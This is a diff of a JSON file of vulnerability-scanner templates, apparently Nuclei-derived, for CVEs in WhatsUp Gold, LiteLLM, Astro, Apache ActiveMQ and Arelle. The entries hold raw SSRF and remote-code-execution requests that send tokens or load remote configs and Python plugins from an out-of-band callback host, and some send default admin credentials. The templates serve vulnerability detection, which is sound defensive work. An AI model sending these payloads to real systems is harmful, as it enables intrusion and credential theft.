+            "POST /NmAPI/RecurringReport HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nSOAPAction: http://tempuri.org/IRecurringReportServices/TestRecurringReport\n\n<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Body><TestRecurringReport xmlns=\"http://tempuri.org/\"><rr xmlns:a=\"http://schemas.datacontract.org/2004/07/WUGDataAccess.RecurringReports.DataContracts\" xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\"><a:AlternateHost i:nil=\"true\"/><a:Disabled>false</a:Disabled><a:EmailSettings xmlns:b=\"http://schemas.datacontract.org/2004/07/WUGDataAccess.Core.DataContracts\"><b:Authentication>None</b:Authentication><b:CredentialsId i:nil=\"true\"/><b:DirectoryPath>C:\\PROGRA~2\\Ipswitch\\WhatsUp\\Data\\ScheduledReports</b:DirectoryPath><b:Password/><b:Port>25</b:Port><b:SMTPServer/><b:SendFrom>WhatsUpGold@YourDomain.com</b:SendFrom><b:SendTo i:nil=\"true\"/><b:Subject>Emailing: Wireless Log</b:Subject><b:TimeoutSec>5</b:TimeoutSec><b:UseEncryptedConn>false</b:UseEncryptedConn><b:Username/></a:EmailSettings><a:ExportOptions><a:AuthorName>WhatsUp Gold</a:AuthorName><a:AutosizePDFPage>true</a:AutosizePDFPage><a:AvoidImageBreak>false</a:AvoidImageBreak><a:AvoidTextBreak>true</a:AvoidTextBreak><a:BrowserPageHeight>0</a:BrowserPageHeight><a:BrowserPageWidth>0</a:BrowserPageWidth><a:ConversionDelay>3</a:ConversionDelay><a:CustomPageHeight>0</a:CustomPageHeight><a:CustomPageWidth>0</a:CustomPageWidth><a:ExportAuthToken/><a:ExportType>html</a:ExportType><a:FitHeight>false</a:FitHeight><a:FitWidth>false</a:FitWidth><a:InternalLinksEnabled>false</a:InternalLinksEnabled><a:LiveURLsEnabled>false</a:LiveURLsEnabled><a:NavigationTimeout>240</a:NavigationTimeout><a:PageOrientation>Portrait</a:PageOrientation><a:PageSize>Letter</a:PageSize><a:PdfMessage>html</a:PdfMessage><a:PreviewEnabled>false</a:PreviewEnabled><a:Subject i:nil=\"true\"/><a:TimeFormat>g:i:s a</a:TimeFormat><a:Title i:nil=\"true\"/><a:ToMail>true</a:ToMail><a:WebExportDirectory>C:\\\\Program Files (x86)\\\\Ipswitch\\\\WhatsUp\\\\html\\\\NmConsole\\\\</a:WebExportDirectory><a:ZipEnabled>false</a:ZipEnabled></a:ExportOptions><a:IncludeURLInEmail>false</a:IncludeURLInEmail><a:Name>2e441d4d5a4b258b</a:Name><a:NextRun i:nil=\"true\"/><a:RecurringReportID>-1</a:RecurringReportID><a:Schedule xmlns:b=\"http://schemas.datacontract.org/2004/07/WUGDataAccess.Core.DataContracts\"><b:DailyDays>1</b:DailyDays><b:DailyOptions>Interval</b:DailyOptions><b:DaysOfTheWeek xmlns:c=\"http://schemas.microsoft.com/2003/10/Serialization/Arrays\"><c:boolean>true</c:boolean><c:boolean>true</c:boolean><c:boolean>true</c:boolean><c:boolean>true</c:boolean><c:boolean>true</c:boolean><c:boolean>true</c:boolean><c:boolean>true</c:boolean></b:DaysOfTheWeek><b:MonthlyDayMonths>1</b:MonthlyDayMonths><b:MonthlyDayNumber>3</b:MonthlyDayNumber><b:MonthlyOptions>DayOfMonth</b:MonthlyOptions><b:MonthlyRecur>First</b:MonthlyRecur><b:MonthlyRecurDay>Sunday</b:MonthlyRecurDay><b:MonthlyRecurMonths>1</b:MonthlyRecurMonths><b:RecurringInterval>1</b:RecurringInterval><b:RecurringTimeIntervals>Minutes</b:RecurringTimeIntervals><b:ScheduleType>TimeInterval</b:ScheduleType><b:StartTime>2024-07-05T16:59:14.047957+01:00</b:StartTime><b:TimeIntervalStartDate>2024-07-05T16:59:14.047957+01:00</b:TimeIntervalStartDate><b:WeeklyWeeks>1</b:WeeklyWeeks><b:YearlyDayOfMonth>3</b:YearlyDayOfMonth><b:YearlyMonthRecur>First</b:YearlyMonthRecur><b:YearlyMonthRecurDay>Sunday</b:YearlyMonthRecurDay><b:YearlyMonths>March</b:YearlyMonths><b:YearlyOptions>DayOfYear</b:YearlyOptions><b:YearlyRecurMonth>March</b:YearlyRecurMonth></a:Schedule><a:URL>{\"title\":\"foo\",\"renderType\":\"aspx\",\"reports\":[{\"title\":\"thetitle\",\"url\":\"/NmConsole/api/Wireless/ReportWirelessLog\",\"dateRangeFilter\":{\"label\":\"Date Range\",\"n\":0,\"range\":\"Today\",\"text\":\"Today\"},\"severityFilter\":{\"label\":\"Severity\",\"value\":-1,\"text\":\"ALL\"},\"limit\":50,\"grid\":{\"emptyText\":\"[ No records found ]\",\"columns\":[{\"dataIndex\":\"Date\",\"text\":\"Date\",\"flex\":1},{\"dataIndex\":\"Severity\",\"text\":\"Severity\",\"flex\":1},{\"dataIndex\":\"Message\",\"text\":\"Message\",\"flex\":1}],\"filters\":[],\"sorters\":[]}}],\"baseUrl\":\"http://{{interactsh-url}}\",\"userId\":1}</a:URL><a:WebUserID>1</a:WebUserID><a:WebUserName>admin</a:WebUserName></rr></TestRecurringReport></s:Body></s:Envelope>\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2024-6587",
+      "info": {
+        "name": "LiteLLM - Server-Side Request Forgery",
+        "severity": "high",
+        "tags": [
+          "cve",
+          "cve2024",
+          "ssrf",
+          "openai",
+          "litellm",
+          "vkev",
+          "vuln",
+          "ai"
+        ],
+        "cve": "CVE-2024-6587",
+        "prerequisite": false
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "word",
+              "part": "interactsh_request",
+              "words": [
+                "Bearer"
+              ]
+            }
+          ],
+          "raw": [
+            "POST /chat/completions HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\n  \"model\": \"command-nightly\",\n  \"messages\": [\n    {\n      \"content\": \"Hello, how are you?\",\n      \"role\": \"user\"\n    }\n  ],\n  \"api_base\": \"https://{{interactsh-url}}\"\n}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2025-64525",
+      "info": {
+        "name": "Astro - Broken Access Control",
+        "severity": "medium",
+        "tags": [
+          "cve",
+          "cve2025",
+          "astro",
+          "ssrf",
+          "oast",
+          "oob"
+        ],
+        "cve": "CVE-2025-64525",
+        "prerequisite": false
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "word",
+              "part": "interactsh_request",
+              "words": [
+                "User-Agent: Astro-Middleware",
+                "User-Agent: node"
+              ],
+              "condition": "or"
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "/"
+          ],
+          "headers": {
+            "x-forwarded-proto": "http://{{interactsh-url}}"
+          }
+        }
+      ]
+    },
+    {
+      "id": "cve-2026-34197",
+      "info": {
+        "name": "Apache ActiveMQ - Remote Code Execution",
+        "severity": "critical",
+        "tags": [
+          "cve",
+          "cve2026",
+          "activemq",
+          "jolokia",
+          "rce",
+          "oast",
+          "java",
+          "oob"
+        ],
+        "cve": "CVE-2026-34197",
+        "prerequisite": false,
+        "cwe": "CWE-94"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "[{\"request\":{",
+                "org.apache.activemq"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http",
+                "dns"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "raw": [
+            "POST /api/jolokia/ HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\nOrigin: {{RootURL}}\n\n[{\"type\":\"exec\",\"mbean\":\"org.apache.activemq:type=Broker,brokerName=localhost\",\"operation\":\"removeNetworkConnector\",\"arguments\":[\"NC\"]},{\"type\":\"exec\",\"mbean\":\"org.apache.activemq:type=Broker,brokerName=localhost\",\"operation\":\"addNetworkConnector\",\"arguments\":[\"static:(vm://{{string}}?brokerConfig=xbean:http://{{interactsh-url}}/{{filename}}.xml)\"]}]\n",
+            "POST /api/jolokia/ HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\nOrigin: {{RootURL}}\nAuthorization: Basic YWRtaW46YWRtaW4=\n\n[{\"type\":\"exec\",\"mbean\":\"org.apache.activemq:type=Broker,brokerName=localhost\",\"operation\":\"removeNetworkConnector\",\"arguments\":[\"NC\"]},{\"type\":\"exec\",\"mbean\":\"org.apache.activemq:type=Broker,brokerName=localhost\",\"operation\":\"addNetworkConnector\",\"arguments\":[\"static:(vm://{{string}}?brokerConfig=xbean:http://{{interactsh-url}}/{{filename}}.xml)\"]}]\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2026-40466",
+      "info": {
+        "name": "Apache ActiveMQ - Remote Code Execution via HTTP Discovery Transport Bypass",
+        "severity": "high",
+        "tags": [
+          "cve",
+          "cve2026",
+          "activemq",
+          "apache",
+          "rce",
+          "jolokia",
+          "oob",
+          "http"
+        ],
+        "cve": "CVE-2026-40466",
+        "prerequisite": false,
+        "cwe": "CWE-20,CWE-94"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "{\"request\":{",
+                "org.apache.activemq"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http",
+                "dns"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "raw": [
+            "POST /api/jolokia/ HTTP/1.1\nHost: {{Hostname}}\nAuthorization: Basic YWRtaW46YWRtaW4=\nContent-Type: application/json\nOrigin: {{RootURL}}\n\n{\"type\":\"exec\",\"mbean\":\"org.apache.activemq:type=Broker,brokerName=localhost\",\"operation\":\"removeNetworkConnector(java.lang.String)\",\"arguments\":[\"NC\"]}\n",
+            "POST /api/jolokia/ HTTP/1.1\nHost: {{Hostname}}\nAuthorization: Basic YWRtaW46YWRtaW4=\nContent-Type: application/json\nOrigin: {{RootURL}}\n\n{\"type\":\"exec\",\"mbean\":\"org.apache.activemq:type=Broker,brokerName=localhost\",\"operation\":\"addNetworkConnector(java.lang.String)\",\"arguments\":[\"http://{{interactsh-url}}/discovery\"]}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2026-42796",
+      "info": {
+        "name": "Arelle < 2.39.10 - Remote Code Execution",
+        "severity": "critical",
+        "tags": [
+          "cve",
+          "cve2026",
+          "arelle",
+          "rce",
+          "oast",
+          "unauth"
+        ],
+        "cve": "CVE-2026-42796",
+        "prerequisite": false,
+        "cwe": "CWE-306"
+      },
+      "requests": [
+        {
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "word",
+              "part": "interactsh_protocol",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "Configuration Request"
+              ]
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "/rest/configure?plugins=http://{{interactsh-url}}/{{randstr}}.py"
+          ]
+        }
+      ]
     }
   ]
 }
